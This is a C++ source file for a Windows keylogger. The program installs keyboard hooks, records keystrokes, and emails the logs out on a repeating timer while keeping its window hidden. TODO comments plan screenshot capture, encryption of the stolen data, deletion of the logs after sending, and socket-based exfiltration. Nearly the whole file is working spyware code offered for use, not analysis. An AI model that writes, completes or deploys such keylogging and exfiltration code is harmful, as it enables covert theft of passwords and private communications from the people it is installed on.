// TODO delete logs after running them
// TODO grab screen buffer based on timer
// TODO Encode screen buffer into base64
// TODO encrypt mail with a hard coded public key
// TODO Potentially change from email based delivery system to socket based one
// TODO potentially add timestamp to every key pressed (or atleast every line)
// TODO compress screenshots
// TODO create new email
// TODO look for strings in executable
// TODO potentially send debug logs back to user as well

#include <iostream>
#include <filesystem>
#include <windows.h>

#include "Settings.h"

#include "Utils.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "MailUtils.h"
#include "KeyboardManager.h"

using namespace std;

// MailTimer Handler function
void DumpKeylog()
{
	if (KeyboardManager::GetInstance().keylog.empty())
		return;
	
	std::string filename = IO::WriteLog(KeyboardManager::GetInstance().keylog);

	if (filename.empty())
	{
		IO::WriteAppLog("File Creation was not succesfull. Keylog'" + KeyboardManager::GetInstance().keylog + "'");
		return;
	}

	// std::vector<std::string> attatchments = IO::GetAttatchments(IO::GetOutputPath(true));
	int x = MailUtils::SendMail("Log [" + filename + "]", "", filename);

	// If script execution returned success
	if (x != 7)
		IO::WriteAppLog("Mail was not sent. Error code: " + Utils::ToString(x));
	else
		KeyboardManager::GetInstance().keylog = "";
}

int main(int argc, char** argv)
{
	// Makes output directory for logs
	IO::MkDir(IO::GetOutputPath(true));

	// Start Listening to keystrokes
	KeyboardManager::GetInstance().InstallHooks();

	// Create and Start mail timer
	Timer mailTimer(DumpKeylog, FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
	mailTimer.Start(true);
	IO::WriteAppLog("Mail Timer Started");

	// Run infinite loop and prevent console window from showing
	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}

	KeyboardManager::GetInstance().UninstallHooks();
	mailTimer.Stop();
	return 0;
}
